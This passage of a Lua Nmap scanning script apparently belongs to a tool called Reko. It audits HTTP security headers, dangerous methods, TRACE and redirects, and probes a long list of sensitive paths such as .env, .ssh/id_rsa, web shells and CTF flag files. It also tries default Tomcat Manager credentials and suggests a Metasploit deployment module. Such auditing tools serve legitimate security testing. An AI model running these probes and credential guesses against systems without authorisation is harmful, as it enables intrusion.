                        .. "'allow-transfer { secondary_ns_ip; };' (BIND) "
                        .. "or 'allow-axfr-ips: <ip>' (PowerDNS/Unbound)",
      },
      0.99, 0.80
    )
    log_warn(ctx, "dns", string.format(
      "AXFR SUCCESS for %s – %d answer records, %d bytes",
      domain, hdr.ancount, #axfr_resp
    ))
  else
    log_info(ctx, "dns", "AXFR returned insufficient records – transfer likely denied")
  end

end)

end  -- scope block



do  -- scope block: keeps locals under Lua 5.1's 200-variable limit

-- ===========================================================================
-- HTTP MODULE  (port 80/tcp — also fires on any http service_key port)
-- ===========================================================================
-- Checks performed (by aggression level):
--
--  AGG 0 – passive:
--    [P1] Server header + technology fingerprint (X-Powered-By, X-Generator…)
--    [P2] Security header audit:
--         Missing: Strict-Transport-Security, X-Frame-Options,
--                  X-Content-Type-Options, Content-Security-Policy,
--                  Referrer-Policy, Permissions-Policy
--    [P3] HTTP method audit: test OPTIONS response for dangerous verbs
--         (PUT, DELETE, TRACE, CONNECT)
--    [P4] Redirect chain: follow up to 5 hops, flag http→https upgrades
--         and open-redirect indicators
--    [P5] robots.txt fetch: surface Disallow entries as recon data
--    [P6] Common sensitive path probe: /.git/HEAD, /.env, /backup,
--         /admin, /wp-admin, /phpinfo.php, /server-status, /server-info,
--         /.htaccess, /web.config, /crossdomain.xml, /sitemap.xml
--
--  AGG 1 – safe-active:
--    [A1] Directory listing detection on probed paths (200 + "Index of")
--    [A2] Default credential page detection (login forms with known defaults)
--    [A3] HTTP TRACE method enabled (XST attack vector)
--
--  Scoring rationale:
--    Sensitive path exposed (/.git, /.env) → confidence 0.99, impact 0.85 → CRITICAL
--    Missing security headers (CSP+HSTS)   → confidence 0.95, impact 0.55 → HIGH
--    Dangerous HTTP methods (PUT/DELETE)   → confidence 0.95, impact 0.70 → HIGH
--    TRACE enabled (XST)                   → confidence 0.95, impact 0.55 → HIGH
--    Server version disclosed              → confidence 0.95, impact 0.35 → MEDIUM
--    Open redirect detected                → confidence 0.85, impact 0.50 → HIGH
--    robots.txt Disallow entries           → confidence 0.95, impact 0.25 → LOW
-- ===========================================================================

-- Sensitive paths to probe — ordered roughly by impact
local HTTP_SENSITIVE_PATHS = {
  -- Source control leakage
  { path = "/.git/HEAD",            label = ".git repository HEAD",         impact = 0.90 },
  { path = "/.git/config",          label = ".git config file",             impact = 0.88 },
  { path = "/.svn/entries",         label = ".svn repository entries",      impact = 0.85 },
  { path = "/.hg/store/00manifest.i",label=".hg Mercurial manifest",       impact = 0.85 },
  -- Environment / config files
  { path = "/.env",                  label = ".env environment file",        impact = 0.92 },
  { path = "/.env.local",            label = ".env.local environment file", impact = 0.90 },
  { path = "/.env.production",       label = ".env.production file",        impact = 0.92 },
  { path = "/config.php",            label = "config.php",                  impact = 0.80 },
  { path = "/wp-config.php.bak",     label = "WordPress config backup",     impact = 0.88 },
  { path = "/configuration.php.bak", label = "Joomla config backup",        impact = 0.85 },
  { path = "/web.config",            label = "ASP.NET web.config",          impact = 0.78 },
  { path = "/.htaccess",             label = ".htaccess file",               impact = 0.65 },
  -- Admin panels
  { path = "/admin",                 label = "Admin panel",                  impact = 0.70 },
  { path = "/admin/",                label = "Admin panel (trailing /)",     impact = 0.70 },
  { path = "/administrator",         label = "Joomla administrator panel",   impact = 0.72 },
  { path = "/wp-admin/",             label = "WordPress admin panel",        impact = 0.72 },
  { path = "/phpmyadmin/",           label = "phpMyAdmin panel",             impact = 0.80 },
  { path = "/phpmyadmin",            label = "phpMyAdmin (no slash)",        impact = 0.80 },
  -- Diagnostic / info pages
  { path = "/phpinfo.php",           label = "phpinfo() output page",        impact = 0.75 },
  { path = "/info.php",              label = "PHP info page (info.php)",     impact = 0.72 },
  { path = "/server-status",         label = "Apache mod_status",           impact = 0.65 },
  { path = "/server-info",           label = "Apache mod_info",             impact = 0.60 },
  { path = "/_profiler",             label = "Symfony profiler",             impact = 0.68 },
  { path = "/telescope",             label = "Laravel Telescope debugger",   impact = 0.70 },
  { path = "/horizon",               label = "Laravel Horizon dashboard",    impact = 0.65 },
  -- Backup / archive files
  { path = "/backup",                label = "Backup directory",             impact = 0.70 },
  { path = "/backup.zip",            label = "backup.zip archive",           impact = 0.85 },
  { path = "/backup.tar.gz",         label = "backup.tar.gz archive",        impact = 0.85 },
  { path = "/db.sql",                label = "Database SQL dump",            impact = 0.90 },
  { path = "/dump.sql",              label = "Database dump file",           impact = 0.90 },
  -- XML / policy files (recon)
  { path = "/crossdomain.xml",       label = "Flash crossdomain policy",     impact = 0.40 },
  { path = "/clientaccesspolicy.xml",label = "Silverlight access policy",   impact = 0.35 },
  { path = "/sitemap.xml",           label = "XML sitemap",                  impact = 0.20 },
  { path = "/robots.txt",            label = "robots.txt",                   impact = 0.20 },
  -- ── CTF / common web app paths (C9) ─────────────────────────────────────
  { path = "/dvwa/",                  label = "DVWA (Damn Vulnerable Web App)",impact = 0.80 },
  { path = "/dvwa/login.php",         label = "DVWA login page",              impact = 0.78 },
  { path = "/mutillidae/",            label = "Mutillidae vulnerable app",    impact = 0.80 },
  { path = "/mutillidae/index.php",   label = "Mutillidae index",             impact = 0.78 },
  { path = "/phpmyadmin/",            label = "phpMyAdmin panel",             impact = 0.82 },
  { path = "/phpmyadmin/index.php",   label = "phpMyAdmin index",             impact = 0.82 },
  { path = "/pma/",                   label = "phpMyAdmin (short path)",      impact = 0.80 },
  { path = "/mysql/",                 label = "MySQL web panel",              impact = 0.78 },
  { path = "/tikiwiki/",              label = "TikiWiki CMS",                 impact = 0.70 },
  { path = "/tikiwiki/tiki-index.php",label = "TikiWiki index",              impact = 0.68 },
  { path = "/twiki/",                 label = "TWiki collaboration platform", impact = 0.68 },
  { path = "/twiki/bin/view",         label = "TWiki view endpoint",          impact = 0.65 },
  { path = "/wordpress/",             label = "WordPress installation",       impact = 0.72 },
  { path = "/wp-login.php",           label = "WordPress login",              impact = 0.72 },
  { path = "/joomla/",                label = "Joomla CMS",                   impact = 0.72 },
  { path = "/drupal/",                label = "Drupal CMS",                   impact = 0.70 },
  { path = "/webdav/",                label = "WebDAV directory",             impact = 0.78 },
  { path = "/manager/html",           label = "Tomcat Manager",               impact = 0.90 },
  { path = "/manager/status",         label = "Tomcat status page",           impact = 0.72 },
  { path = "/host-manager/html",      label = "Tomcat Host Manager",          impact = 0.88 },
  { path = "/console/",               label = "JBoss/WildFly console",        impact = 0.85 },
  { path = "/jmx-console/",           label = "JBoss JMX Console",            impact = 0.88 },
  { path = "/admin/console",          label = "Admin console",                impact = 0.82 },
  { path = "/solr/",                  label = "Apache Solr admin",            impact = 0.75 },
  { path = "/jenkins/",               label = "Jenkins CI server",            impact = 0.85 },
  { path = "/jenkins/script",         label = "Jenkins script console (RCE)", impact = 0.95 },
  { path = "/actuator",               label = "Spring Boot Actuator",         impact = 0.78 },
  { path = "/actuator/env",           label = "Spring Actuator env endpoint", impact = 0.85 },
  { path = "/actuator/heapdump",      label = "Spring Actuator heap dump",    impact = 0.88 },
  { path = "/api/",                   label = "API root endpoint",            impact = 0.55 },
  { path = "/api/v1/",                label = "API v1 endpoint",              impact = 0.55 },
  { path = "/swagger-ui.html",        label = "Swagger UI (API docs)",        impact = 0.65 },
  { path = "/swagger-ui/",            label = "Swagger UI directory",         impact = 0.65 },
  { path = "/v2/api-docs",            label = "Swagger API docs JSON",        impact = 0.65 },
  { path = "/upload",                 label = "File upload endpoint",         impact = 0.80 },
  { path = "/uploads/",               label = "Uploads directory",            impact = 0.75 },
  { path = "/files/",                 label = "Files directory",              impact = 0.72 },
  { path = "/secret",                 label = "Secret path",                  impact = 0.70 },
  { path = "/secret/",                label = "Secret directory",             impact = 0.70 },
  { path = "/flag",                   label = "CTF Flag file (direct)",       impact = 0.99 },
  { path = "/flag.txt",               label = "CTF Flag file .txt",           impact = 0.99 },
  { path = "/flag.php",               label = "CTF Flag file .php",           impact = 0.99 },
  { path = "/.flag",                  label = "CTF Hidden flag file",         impact = 0.99 },
  { path = "/user.txt",               label = "HackTheBox user flag",         impact = 0.99 },
  { path = "/root.txt",               label = "HackTheBox root flag",         impact = 0.99 },
  { path = "/proof.txt",              label = "OSCP proof file",              impact = 0.99 },
  { path = "/local.txt",              label = "OSCP local flag",              impact = 0.99 },
  { path = "/cgi-bin/",               label = "CGI bin directory",            impact = 0.70 },
  { path = "/cgi-bin/admin.cgi",      label = "Admin CGI script",             impact = 0.82 },
  { path = "/test/",                  label = "Test directory",               impact = 0.60 },
  { path = "/dev/",                   label = "Dev directory",                impact = 0.65 },
  { path = "/staging/",               label = "Staging environment",          impact = 0.68 },
  { path = "/old/",                   label = "Old/legacy directory",         impact = 0.65 },
  { path = "/bak/",                   label = "Backup directory",             impact = 0.78 },
  { path = "/config/",                label = "Config directory",             impact = 0.80 },
  { path = "/conf/",                  label = "Conf directory",               impact = 0.78 },
  { path = "/logs/",                  label = "Logs directory",               impact = 0.72 },
  { path = "/log/",                   label = "Log directory",                impact = 0.70 },
  { path = "/debug/",                 label = "Debug endpoint",               impact = 0.72 },
  { path = "/console",                label = "Web console",                  impact = 0.82 },
  { path = "/shell",                  label = "Web shell endpoint",           impact = 0.95 },
  { path = "/shell.php",              label = "PHP web shell",                impact = 0.99 },
  { path = "/cmd.php",                label = "PHP command exec page",        impact = 0.99 },
  { path = "/c99.php",                label = "c99 web shell",                impact = 0.99 },
  { path = "/r57.php",                label = "r57 web shell",                impact = 0.99 },
  { path = "/webshell.php",           label = "Web shell (generic)",          impact = 0.99 },
  { path = "/.ssh/",                  label = "SSH directory exposed",        impact = 0.99 },
  { path = "/.ssh/authorized_keys",   label = "SSH authorized_keys exposed",  impact = 0.99 },
  { path = "/.ssh/id_rsa",            label = "SSH private key exposed",      impact = 0.99 },
  { path = "/etc/passwd",             label = "Linux passwd file (path trav)",impact = 0.99 },
  { path = "/proc/self/environ",      label = "Process environ (LFI probe)",  impact = 0.95 },
}

-- Security response headers that MUST be present on any HTTP response
-- Format: { header_name, description, recommended_value, impact_if_missing }
local HTTP_SECURITY_HEADERS = {
  {
    name   = "Strict-Transport-Security",
    desc   = "HSTS not set — browser connections can be downgraded to HTTP",
    rec    = "max-age=63072000; includeSubDomains; preload",
    impact = 0.60,
  },
  {
    name   = "X-Frame-Options",
    desc   = "Clickjacking protection missing (X-Frame-Options absent)",
    rec    = "DENY or SAMEORIGIN",
    impact = 0.50,
  },
  {
    name   = "X-Content-Type-Options",
    desc   = "MIME-sniffing protection missing — browser may interpret files incorrectly",
    rec    = "nosniff",
    impact = 0.45,
  },
  {
    name   = "Content-Security-Policy",
    desc   = "No CSP header — XSS and data-injection attacks are unrestricted",
    rec    = "default-src 'self'; script-src 'self'",
    impact = 0.65,
  },
  {
    name   = "Referrer-Policy",
    desc   = "Referrer-Policy absent — sensitive URL fragments may leak to third parties",
    rec    = "strict-origin-when-cross-origin",
    impact = 0.35,
  },
  {
    name   = "Permissions-Policy",
    desc   = "Permissions-Policy absent — browser APIs (camera, mic, geolocation) unrestricted",
    rec    = "camera=(), microphone=(), geolocation=()",
    impact = 0.30,
  },
}

-- Dangerous HTTP methods to flag if server supports them
local HTTP_DANGEROUS_METHODS = { "PUT", "DELETE", "TRACE", "CONNECT", "PATCH" }

--- Perform a raw HTTP/1.1 GET request using nmap.new_socket().
-- Returns (status_code, headers_table, body_string, nil) or (nil,nil,nil,err).
-- We build the request manually to avoid the NSE http library's redirect
-- following, which we want to control ourselves.
local function http_raw_get(host_ip, port_num, path, timeout_ms, host_header)
  local sd, err = tcp_connect(host_ip, port_num, timeout_ms)
  if not sd then return nil, nil, nil, err end

  host_header = host_header or host_ip
  local req = table.concat({
    "GET " .. path .. " HTTP/1.1\r\n",
    "Host: " .. host_header .. "\r\n",
    "User-Agent: Reko/" .. REKO_VERSION .. " (NSE)\r\n",
    "Accept: */*\r\n",
    "Connection: close\r\n",
    "\r\n",
  })

  local ok, serr = sock_send(sd, req)
  if not ok then sock_close(sd); return nil, nil, nil, serr end

  -- Read up to 32 KB of response
  local response = ""
  local MAX_RESP = 32768
  while #response < MAX_RESP do
    local status, chunk = sd:receive()
    if not status then break end
    response = response .. chunk
  end
  sock_close(sd)

  -- Split headers and body on the first blank line
  local header_block, body = response:match("^(.-)\r\n\r\n(.*)$")
  if not header_block then
    -- Try \n\n (some servers)
    header_block, body = response:match("^(.-)\n\n(.*)$")
  end
  if not header_block then
    return nil, nil, nil, "Could not parse HTTP response"
  end

  -- Parse status line
  local status_code = header_block:match("^HTTP/%d%.%d%s+(%d%d%d)")
  if not status_code then
    return nil, nil, nil, "No HTTP status line found"
  end

  -- Parse headers into a lowercase-keyed table
  -- Multiple values for the same header are concatenated with "; "
  local headers = {}
  for line in header_block:gmatch("[^\r\n]+") do
    local k, v = line:match("^([^:]+):%s*(.+)$")
    if k then
      k = k:lower()
      headers[k] = headers[k] and (headers[k] .. "; " .. trim(v)) or trim(v)
    end
  end

  return tonumber(status_code), headers, body or "", nil
end

--- Perform a raw HTTP OPTIONS request and return the Allow header value.
local function http_raw_options(host_ip, port_num, timeout_ms, host_header)
  local sd, err = tcp_connect(host_ip, port_num, timeout_ms)
  if not sd then return nil, err end

  host_header = host_header or host_ip
  local req = table.concat({
    "OPTIONS * HTTP/1.1\r\n",
    "Host: " .. host_header .. "\r\n",
    "User-Agent: Reko/" .. REKO_VERSION .. " (NSE)\r\n",
    "Connection: close\r\n",
    "\r\n",
  })

  local ok, serr = sock_send(sd, req)
  if not ok then sock_close(sd); return nil, serr end

  local response = ""
  while #response < 4096 do
    local status, chunk = sd:receive()
    if not status then break end
    response = response .. chunk
  end
  sock_close(sd)

  -- Extract Allow header
  local allow = response:match("[Aa]llow:%s*([^\r\n]+)")
  return allow and trim(allow) or "", nil
end

--- Send HTTP TRACE and check if the server echoes back the request.
-- Returns true if TRACE is active (XST risk), false otherwise.
local function http_test_trace(host_ip, port_num, timeout_ms, host_header)
  local sd, err = tcp_connect(host_ip, port_num, timeout_ms)
  if not sd then return false end

  host_header = host_header or host_ip
  local marker = "X-Reko-Trace: " .. tostring(os.time())
  local req = table.concat({
    "TRACE / HTTP/1.1\r\n",
    "Host: " .. host_header .. "\r\n",
    "User-Agent: Reko/" .. REKO_VERSION .. " (NSE)\r\n",
    marker .. "\r\n",
    "Connection: close\r\n",
    "\r\n",
  })

  sock_send(sd, req)
  local response = ""
  while #response < 4096 do
    local status, chunk = sd:receive()
    if not status then break end
    response = response .. chunk
  end
  sock_close(sd)

  -- If TRACE is active the server echoes our request back in the body
  return response:find(marker, 1, true) ~= nil
end

--- Follow redirect chain up to max_hops.
-- Returns table of { url, status } per hop.
local function http_follow_redirects(host_ip, port_num, start_path, timeout_ms, host_header, max_hops)
  max_hops = max_hops or 5
  local chain = {}
  local current_path = start_path
  local current_host = host_header or host_ip
  local current_port = port_num

  for hop = 1, max_hops do
    local code, headers, _, err = http_raw_get(
      host_ip, current_port, current_path, timeout_ms, current_host
    )
    if err or not code then break end

    table.insert(chain, { url = current_host .. current_path, status = code })

    if code < 300 or code >= 400 then break end  -- not a redirect

    local location = headers and headers["location"]
    if not location then break end

    -- Check for open-redirect indicator: Location header points to
    -- a completely different host than the one we started with
    local redir_host = location:match("https?://([^/]+)")
    if redir_host and redir_host ~= current_host then
      table.insert(chain, { url = location, status = "external-redirect", hop = hop })
      break
    end

    -- Parse relative or absolute path for next hop
    current_path = location:match("https?://[^/]+(/.*)") or location
    if not current_path:match("^/") then current_path = "/" .. current_path end
  end

  return chain
end

-- Main HTTP module
register_module("http", function(ctx)
  local host_ip   = ctx.target_ip
  local port_num  = ctx.port_number
  local timeout   = ctx.config.timeout
  local agg       = ctx.config.aggression
  local host_hdr  = ctx.target_host ~= ctx.target_ip and ctx.target_host or host_ip

  -- ---- [P1] Server header + technology fingerprint ----------------------
  local code, headers, body, err = http_raw_get(host_ip, port_num, "/", timeout, host_hdr)
  if err or not code then
    log_warn(ctx, "http", "GET / failed: " .. (err or "no response"))
    return
  end
  log_info(ctx, "http", string.format("GET / → %d, %d bytes", code, #body))

  -- Server header
  local server_hdr = headers and headers["server"]
  if server_hdr and server_hdr ~= "" then
    ctx:add_finding(
      "HTTP Server header discloses software version",
      string.format(
        "The Server response header reveals the web server software and "
        .. "version: '%s'. Attackers use this to identify version-specific "
        .. "CVEs and default configuration weaknesses.",
        server_hdr
      ),
      {
        server_header = server_hdr,
        remediation   = "Set a generic or empty Server header. "
                        .. "Apache: ServerTokens Prod; Nginx: server_tokens off",
      },
      0.95, 0.35
    )
  end

  -- Technology disclosure headers
  local tech_headers = {
    ["x-powered-by"]       = "X-Powered-By",
    ["x-generator"]        = "X-Generator",
    ["x-aspnet-version"]   = "X-AspNet-Version",
    ["x-aspnetmvc-version"]= "X-AspNetMvc-Version",
  }
  local tech_found = {}
  for h_key, h_label in pairs(tech_headers) do
    local val = headers and headers[h_key]
    if val and val ~= "" then
      table.insert(tech_found, h_label .. ": " .. val)
    end
  end
  if #tech_found > 0 then
    ctx:add_finding(
      "HTTP technology stack disclosed via response headers",
      "One or more headers reveal the backend technology stack, framework "
      .. "version, or programming language. This information assists attackers "
      .. "in selecting targeted exploits.",
      {
        disclosed_headers = table.concat(tech_found, " | "),
        remediation       = "Remove or suppress X-Powered-By and related "
                            .. "headers in framework/server configuration",
      },
      0.95, 0.40
    )
  end

  -- ---- [P2] Security header audit --------------------------------------
  local missing_headers = {}
  for _, hdef in ipairs(HTTP_SECURITY_HEADERS) do
    local val = headers and headers[hdef.name:lower()]
    if not val or val == "" then
      table.insert(missing_headers, {
        name   = hdef.name,
        desc   = hdef.desc,
        rec    = hdef.rec,
        impact = hdef.impact,
      })
    end
  end

  if #missing_headers > 0 then
    -- Group them into one finding, scored by the highest-impact missing header
    local max_impact = 0
    local header_names = {}
    local detail_lines = {}
    for _, mh in ipairs(missing_headers) do
      if mh.impact > max_impact then max_impact = mh.impact end
      table.insert(header_names, mh.name)
      table.insert(detail_lines, mh.name .. " → " .. mh.rec)
    end
    ctx:add_finding(
      string.format("HTTP security headers missing (%d/%d)", #missing_headers, #HTTP_SECURITY_HEADERS),
      "The following security response headers are absent. Each missing header "
      .. "leaves a specific browser-side protection disabled. The highest-impact "
      .. "absence is Content-Security-Policy (XSS amplification) and "
      .. "Strict-Transport-Security (HTTP downgrade).",
      {
        missing_headers   = table.concat(header_names, ", "),
        recommended_values= table.concat(detail_lines, " | "),
        remediation       = "Add the listed headers in your web server or "
                            .. "application middleware configuration",
      },
      0.95, max_impact
    )
  end

  -- ---- [P3] HTTP method audit ------------------------------------------
  local allow_header, _ = http_raw_options(host_ip, port_num, timeout, host_hdr)
  if allow_header and allow_header ~= "" then
    log_info(ctx, "http", "OPTIONS Allow: " .. allow_header)
    local dangerous_found = {}
    for _, method in ipairs(HTTP_DANGEROUS_METHODS) do
      if allow_header:upper():find(method, 1, true) then
        table.insert(dangerous_found, method)
      end
    end
    if #dangerous_found > 0 then
      ctx:add_finding(
        "Dangerous HTTP methods enabled: " .. table.concat(dangerous_found, ", "),
        "The server's OPTIONS response includes methods beyond GET/POST/HEAD. "
        .. "PUT/DELETE allow file manipulation; CONNECT enables proxy abuse; "
        .. "TRACE enables Cross-Site Tracing (XST) attacks that can bypass "
        .. "HttpOnly cookie protections.",
        {
          allow_header     = allow_header,
          dangerous_methods= table.concat(dangerous_found, ", "),
          remediation      = "Disable unused HTTP methods in server config. "
                             .. "Apache: <LimitExcept GET POST HEAD>; "
                             .. "Nginx: limit_except GET POST { deny all; }",
        },
        0.95, 0.70
      )
    end
  end

  -- ---- [P4] Redirect chain analysis ------------------------------------
  if code >= 300 and code < 400 then
    local chain = http_follow_redirects(host_ip, port_num, "/", timeout, host_hdr, 5)
    if #chain > 0 then
      local chain_urls = {}
      local open_redirect = false
      for _, hop in ipairs(chain) do
        table.insert(chain_urls, tostring(hop.status) .. " → " .. hop.url)
        if hop.status == "external-redirect" then
          open_redirect = true
        end
      end
      if open_redirect then
        ctx:add_finding(
          "Open redirect detected in HTTP response chain",
          "The server redirected to an external domain without validation. "
          .. "Open redirects are used in phishing attacks to send victims "
          .. "through a trusted domain before landing on a malicious site.",
          {
            redirect_chain = table.concat(chain_urls, " → "),
            remediation    = "Validate and whitelist redirect destinations; "
                             .. "never redirect to user-supplied URLs without validation",
          },
          0.85, 0.50
        )
      else
        log_info(ctx, "http", "Redirect chain: " .. table.concat(chain_urls, " → "))
      end
    end
  end

  -- ---- [P5] robots.txt recon -------------------------------------------
  local rcode, _, rbody, _ = http_raw_get(host_ip, port_num, "/robots.txt", timeout, host_hdr)
  if rcode == 200 and rbody and #rbody > 0 then
    -- Extract Disallow lines — these are paths the site owner wants hidden
    local disallowed = {}
    for line in rbody:gmatch("[^\r\n]+") do
      local path = line:match("^[Dd]isallow:%s*(.+)$")
      if path then
        path = trim(path)
        if path ~= "" then table.insert(disallowed, path) end
      end
    end
    if #disallowed > 0 then
      ctx:add_finding(
        string.format("robots.txt Disallow entries expose %d hidden paths", #disallowed),
        "The robots.txt file lists paths that the site owner wants excluded from "
        .. "search engines. These entries often reveal admin panels, backup "
        .. "directories, API endpoints, and other sensitive locations — "
        .. "exactly the areas an attacker would target first.",
        {
          disallowed_paths = table.concat(disallowed, " | "),
          note             = "robots.txt is publicly readable; listing paths "
                             .. "here does not restrict access",
        },
        0.95, 0.25
      )
    end
  end

  -- ---- [P6] Sensitive path probing -------------------------------------
  local exposed_paths = {}
  for _, probe in ipairs(HTTP_SENSITIVE_PATHS) do
    -- Skip robots.txt – already fetched above
    if probe.path ~= "/robots.txt" then
      local pcode, pheaders, pbody, _ = http_raw_get(
        host_ip, port_num, probe.path, timeout, host_hdr
      )
      if pcode == 200 then
        -- Additional filter: avoid false positives from catch-all 200 pages
        -- by checking that the body is non-trivial and doesn't look like
        -- the homepage (size < 300 bytes or contains meaningful keywords)
        local is_fp = false
        if pbody then
          -- If body is very small and matches a known 404-in-disguise pattern
          if #pbody < 50 then is_fp = true end
          -- If body matches homepage (compare lengths as a heuristic)
          if math.abs(#pbody - #body) < 20 and #pbody > 200 then is_fp = true end
        end

        if not is_fp then
          table.insert(exposed_paths, {
            path   = probe.path,
            label  = probe.label,
            impact = probe.impact,
            size   = pbody and #pbody or 0,
          })
        end
      end

      -- AGG 1: Check for directory listing (200 with "Index of" in body)
      if agg >= 1 and pcode == 200 and pbody then
        if pbody:find("Index of", 1, true) or pbody:find("Directory listing", 1, true) then
          ctx:add_finding(
            "Directory listing enabled at " .. probe.path,
            "The web server returns a directory listing at this path, exposing "
            .. "all files and subdirectories to unauthenticated users. "
            .. "Attackers can enumerate and download source code, configs, "
            .. "or backup files.",
            {
              path        = probe.path,
              response_size= tostring(pbody and #pbody or 0) .. " bytes",
              remediation = "Disable directory listing. "
                            .. "Apache: Options -Indexes; Nginx: autoindex off",
            },
            0.99, 0.75
          )
        end
      end
    end
  end

  -- Report exposed paths grouped by impact tier
  if #exposed_paths > 0 then
    -- Sort by impact descending
    table.sort(exposed_paths, function(a, b) return a.impact > b.impact end)

    -- Separate critical-impact paths for individual findings
    for _, ep in ipairs(exposed_paths) do
      local is_critical = ep.impact >= 0.85
      ctx:add_finding(
        (is_critical and "CRITICAL: " or "Sensitive path accessible: ") .. ep.label,
        string.format(
          "HTTP GET %s returned 200 OK with a non-trivial response (%d bytes). "
          .. "This path should not be publicly accessible. "
          .. "%s",
          ep.path, ep.size,
          ep.path:find("%.git") and
            "A leaked .git directory allows full source code reconstruction "
            .. "using tools like git-dumper or gittools." or
          ep.path:find("%.env") and
            "A leaked .env file typically contains database passwords, API keys, "
            .. "and application secrets in plaintext." or
          ep.path:find("phpinfo") and
            "phpinfo() reveals PHP configuration, loaded modules, environment "
            .. "variables, and server paths." or
          "Review the content immediately and restrict access."
        ),
        {
          path          = ep.path,
          label         = ep.label,
          response_size = tostring(ep.size) .. " bytes",
          remediation   = "Restrict access with authentication or remove the "
                          .. "path from the web root",
        },
        0.99, ep.impact
      )
    end
  end

  -- AGG 1: TRACE method XST check
  if agg >= 1 then
    local trace_active = http_test_trace(host_ip, port_num, timeout, host_hdr)
    if trace_active then
      ctx:add_finding(
        "HTTP TRACE method enabled — Cross-Site Tracing (XST) risk",
        "The server echoed back our TRACE request including custom headers. "
        .. "XST attacks use JavaScript's XMLHttpRequest to send TRACE requests "
        .. "and steal HttpOnly cookies that are normally inaccessible to scripts, "
        .. "bypassing this cookie protection.",
        {
          method      = "TRACE",
          remediation = "Disable TRACE: Apache TraceEnable Off; "
                        .. "Nginx: limit_except GET POST HEAD { deny all; }",
        },
        0.95, 0.55
      )
    end
  end

  -- ---- [TOMCAT] Manager panel + default credential check (agg >= 1) ------
  -- Detects Tomcat manager on /manager/html with default credentials
  if agg >= 1 then
    local mgr_code, mgr_headers, mgr_body, _ = http_raw_get(
      host_ip, port_num, "/manager/html", timeout, host_hdr)
    if mgr_code == 401 or mgr_code == 200 then
      -- Manager panel exists - try default credentials via Basic auth
      local tomcat_creds = {
        {"tomcat", "tomcat"},{"admin", "admin"},{"tomcat", "s3cret"},
        {"admin", ""},{"tomcat", "password"},{"manager", "manager"},
      }
      local cred_found = nil
      if mgr_code == 200 then
        -- No auth required!
        cred_found = { "none", "none" }
      else
        for _, cred in ipairs(tomcat_creds) do
          local b64_creds = (cred[1] .. ":" .. cred[2]):gsub(".", function(c)
            return string.format("%02x", c:byte())
          end)
          -- Build GET with Authorization header manually
          local auth_sd, _ = tcp_connect(host_ip, port_num, timeout)
          if auth_sd then
            local b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
            local function base64(s)
              local result, i = "", 1
              while i <= #s do
                local a = s:byte(i) or 0
                local b = s:byte(i+1) or 0
                local c_byte = s:byte(i+2) or 0
                local n = a*65536 + b*256 + c_byte
                result = result
                  .. b64chars:sub(math.floor(n/262144)%64+1, math.floor(n/262144)%64+1)
                  .. b64chars:sub(math.floor(n/4096)%64+1, math.floor(n/4096)%64+1)
                  .. (i+1 <= #s and b64chars:sub(math.floor(n/64)%64+1, math.floor(n/64)%64+1) or "=")
                  .. (i+2 <= #s and b64chars:sub(n%64+1, n%64+1) or "=")
                i = i + 3
              end
              return result
            end
            local auth_token = base64(cred[1] .. ":" .. cred[2])
            local req = "GET /manager/html HTTP/1.1\r\n"
              .. "Host: " .. host_hdr .. "\r\n"
              .. "Authorization: Basic " .. auth_token .. "\r\n"
              .. "Connection: close\r\n\r\n"
            sock_send(auth_sd, req)
            local auth_resp = ""
            for _ = 1, 8 do
              local st, ch = auth_sd:receive()
              if not st then break end
              auth_resp = auth_resp .. ch
              if #auth_resp >= 512 then break end
            end
            sock_close(auth_sd)
            local auth_code = auth_resp:match("^HTTP/%d%.%d%s+(%d%d%d)")
            if auth_code == "200" then
              cred_found = cred
              break
            end
          end
        end
      end

      if cred_found then
        local user_str = cred_found[1] == "none" and "NO AUTH REQUIRED"
          or (cred_found[1] .. ":" .. cred_found[2])
        ctx:add_finding(
          "Tomcat Manager panel accessible: " .. user_str .. " (CRITICAL — WAR upload = RCE)",
          "The Tomcat Manager application at /manager/html is accessible. "
          .. "The Manager allows WAR file deployment — uploading a malicious WAR "
          .. "gives Remote Code Execution on the server as the Tomcat process user. "
          .. "Credentials: " .. user_str,
          {
            path         = "/manager/html",
            credentials  = user_str,
            cve          = "CVE-2017-12617",
            attack_cmd   = "msfconsole: use multi/http/tomcat_mgr_deploy",
            remediation  = "Change default credentials; restrict /manager to localhost; "
                           .. "disable manager if not needed",
          },
          0.99, 0.95
        )
        log_warn(ctx, "http", "TOMCAT MANAGER ACCESSIBLE: " .. user_str)
      else
        ctx:add_finding(
          "Tomcat Manager panel found — default credentials denied",
          "The Tomcat Manager at /manager/html exists but default credentials were rejected. "
          .. "Non-default credentials may still be weak — consider a targeted credential attack.",
          { path = "/manager/html" },
          0.90, 0.60
        )
      end
    end
  end

end)


-- ===========================================================================
-- HTTPS / TLS MODULE  (port 443/tcp)
-- ===========================================================================
-- Checks performed (by aggression level):
--
--  AGG 0 – passive:
--    [P1] TLS protocol version: flag SSLv2, SSLv3, TLSv1.0, TLSv1.1 support
--    [P2] Certificate inspection:
--         - Subject CN and SAN list
--         - Issuer (self-signed detection)
--         - Expiry date (flag within 30 days, already expired)
--         - Wildcard certificate detection
--         - Weak signature algorithm (MD5/SHA1 signed cert)
--    [P3] Cipher suite audit:
--         - NULL ciphers (no encryption)
--         - EXPORT grade ciphers (40/56-bit)
--         - RC4 ciphers
--         - DES/3DES ciphers (SWEET32)
--         - Anonymous (ADH/AECDH) ciphers
--    [P4] HTTP headers on HTTPS (re-run the HTTP security header check
--         on the TLS-wrapped service to catch HSTS misconfigurations)
--
--  AGG 1: no additional active checks — TLS negotiation is already interactive
--
--  Scoring:
--    SSLv2/SSLv3 supported       → confidence 0.99, impact 0.90 → CRITICAL
--    Expired certificate         → confidence 0.99, impact 0.80 → CRITICAL
--    Self-signed certificate     → confidence 0.99, impact 0.70 → HIGH
--    NULL/EXPORT/anon ciphers    → confidence 0.95, impact 0.85 → CRITICAL
--    TLSv1.0/1.1 supported       → confidence 0.95, impact 0.60 → HIGH
--    SHA1-signed certificate     → confidence 0.95, impact 0.55 → HIGH
--    Certificate expiry < 30 days→ confidence 0.99, impact 0.65 → HIGH
--    Weak 3DES/RC4 ciphers       → confidence 0.95, impact 0.65 → HIGH
-- ===========================================================================

-- Deprecated / insecure TLS protocol versions
local TLS_WEAK_PROTOCOLS = {
  { version = "SSLv2",   impact = 0.90, reason = "SSL 2.0 is fundamentally broken (DROWN attack)" },
  { version = "SSLv3",   impact = 0.85, reason = "SSL 3.0 vulnerable to POODLE (CVE-2014-3566)" },
